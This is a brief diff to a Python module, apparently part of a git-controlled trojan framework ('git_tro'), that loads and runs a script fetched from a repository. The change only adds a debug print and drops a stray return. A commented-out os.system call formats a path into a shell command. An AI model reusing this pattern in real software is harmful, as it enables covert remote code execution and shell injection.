@@ -30,6 +30,7 @@ def get_file_contents(filepath):
 
 
 def run(**args): # Must import its personal lib, git_tro will execute this module in # environment
+	print("[*] In RunScriptFromGit module.") #Todelete
 	script	= get_file_contents(scriptPath)
 	#content = None
 	if script is not None:
@@ -50,5 +51,4 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 		#TODO: Customize log file path
 		#os.system("echo 'getRunScript: Unable to find file {}' >> logFile.log".format(scriptPath))
 		return str("getRunScript: Unable to find script {}".format(scriptPath))
-	return 
 
